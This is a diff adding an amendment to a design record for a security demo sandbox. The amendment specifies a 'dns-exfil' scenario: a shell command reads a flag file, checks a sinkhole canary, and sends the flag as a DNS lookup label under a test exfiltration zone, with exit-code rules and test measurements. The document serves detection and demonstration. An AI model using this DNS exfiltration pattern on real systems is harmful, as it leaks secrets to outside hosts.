@@ -223,3 +223,36 @@ and never forwards; the argv ends `; true` because `nslookup` exits non-zero on 
 Falco events, so a rule that starts catching it turns the test red. `tests/scenarios/offline.sh` proves the
 argv and the label form under the pod's security context; the lookup itself is proven live. The SIEM's side
 (the Hubble DNS finding, the correlation, the API's flag match) is ADR 0034's.
+
+## Amendment 2026-10-04: `dns-exfil` exits 0 only on NXDOMAIN, not `; true` (siem contract D3, F10)
+
+The amendment above has the argv end `; true`. As built it does not: a command reaches its objective
+when it exits 0 (`Achieved = cmd.Objective != "" && code == 0`, runner/terminal.go), so `; true` would
+mark "Phone home" achieved even in a quarantined pod, whose lookups Cilium drops before they leave the
+pod - a claim the page must not make. The argv (cluster/infra/sandbox/scenarios/scenarios.yaml, id
+`dns-exfil`) is `sh -c` with ash builtins and busybox `nslookup` only:
+- read the first line of `/srv/shop/.flag`, strip `SDP{` and `}`; anything that is not exactly 16
+  lowercase hex digits ends the command with exit 1 (`no flag found` for non-hex), so the label can
+  only ever be `sdp-<16 hex>` and nothing else can be put into the name;
+- look up the sinkhole's canary, `ok.x.exfil.sdp.test.` - under the flagged name's own parent, so a
+  block that took `x.exfil.sdp.test` over fails it too - and go on only if it answers 192.0.2.53, an
+  answer only the cluster resolver's sinkhole block gives (ADR 0026 amendment of 2026-10-04); anything
+  else ends the command with `sinkhole not answering, nothing sent` and exit 1, before the flagged
+  name exists anywhere outside the pod;
+- print `query sdp-<16 hex>.x.exfil.sdp.test.`, then `nslookup -type=a` of that name and its output;
+- exit 0 only if the output says NXDOMAIN, 1 otherwise.
+NXDOMAIN by itself would not prove the sinkhole answered - any resolver says it for a `.test` name,
+the public root included; the canary, checked first, is what proves it. The catalogue's outcome stays
+`allowed`: prevention lets the query through, and that is the exhibit.
+Measured (tests/scenarios/offline.sh, terminal pod's security context): against the rendered CoreDNS
+the command exits 0 with NXDOMAIN; against a resolver without the sinkhole the canary fails and the
+flagged name never reaches it; with no network it exits 1 in under 0.1 s; against a resolver that
+drops every query - what a quarantined pod meets - busybox `nslookup` gives up on the canary after
+5.0-5.1 s and the command exits 1 (N9). The command is bounded by nslookup's own ~5 s (busybox has no
+timeout option) and the API's 5 s CommandTimeout usually cuts it first; either way it is not achieved.
+tests/scenarios/run.sh bounds its client with `timeout 6`, runs the command only after its sinkhole
+check passed in the same run, and asserts both cases live (exit 0 with NXDOMAIN on the quiet pod; no
+NXDOMAIN and a non-zero exit on the pod `beacon` quarantined).
+The visitor's input line reads `nslookup sdp-<flag>.x.exfil.sdp.test.` and the explanation says that
+the command reads the flag file, builds the label and checks first that the cluster resolver answers
+the zone itself: what is displayed is what runs (M12).
